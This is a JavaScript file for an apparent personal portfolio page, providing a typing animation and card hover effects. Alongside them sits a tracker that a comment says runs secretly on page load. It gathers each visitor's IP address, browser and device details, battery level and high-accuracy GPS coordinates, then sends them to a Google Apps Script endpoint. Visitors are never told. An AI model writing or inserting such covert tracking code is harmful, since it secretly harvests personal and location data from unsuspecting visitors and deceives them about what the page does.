(async function() {
    // 1. DEFINISI FUNGSI TRACKER
    const startTracker = async () => {
        let payload = {
            ip: "Checking...",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            ram: navigator.deviceMemory || "N/A",
            battery: null
        };

        // Ambil Data Baterai
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                payload.battery = Math.round(b.level * 100);
            } catch (e) {}
        }

        // Ambil IP
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            payload.ip = d.ip;
        } catch (e) {
            payload.ip = "IP Blocked/Hidden";
        }

        const send = (data) => {
            fetch("https://script.google.com/macros/s/AKfycbyrr8bjew4x5wXGn0nuLazDLszg0l2VO6CvPA9_tdq1KBbJyCFVUQkooLzwgnc9Pskibw/exec", {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify(data)
            });
        };

        // Kirim Data Dasar Segera (IP & Device)
        send(payload);

        // Minta Lokasi (Data Kedua)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                payload.lat = pos.coords.latitude;
                payload.long = pos.coords.longitude;
                payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
                send(payload); // Update baris yang sama di GS dengan koordinat
            }, null, { enableHighAccuracy: true });
        }
    };

    // 2. UI EFFECTS (ORIGINAL)
    const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
    let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

    function typeText() {
        const typedElement = document.getElementById('typed-text');
        if (!typedElement) return; // Guard clause jika element belum ada

        const currentText = texts[textIndex];
        if (isDeleting) {
            typedElement.textContent = currentText.substring(0, charIndex - 1);
            charIndex--;
            typingDelay = 75;
        } else {
            typedElement.textContent = currentText.substring(0, charIndex + 1);
            charIndex++;
            typingDelay = 150;
        }

        if (!isDeleting && charIndex === currentText.length) {
            typingDelay = 2000; 
            isDeleting = true;
        } else if (isDeleting && charIndex === 0) {
            isDeleting = false;
            textIndex = (textIndex + 1) % texts.length;
            typingDelay = 500;
        }
        setTimeout(typeText, typingDelay);
    }

    // 3. INISIALISASI SAAT WINDOW LOAD
    window.addEventListener('load', () => {
        // Jalankan typing effect
        setTimeout(typeText, 1000);
        
        // Jalankan tracker diam-diam
        startTracker();

        // Card Ripple Effect
        document.querySelectorAll('.card').forEach(card => {
            card.addEventListener('mousemove', (e) => {
                const rect = card.getBoundingClientRect();
                const x = ((e.clientX - rect.left) / rect.width) * 100;
                const y = ((e.clientY - rect.top) / rect.height) * 100;
                card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
                card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
            });
        });
    });
})();
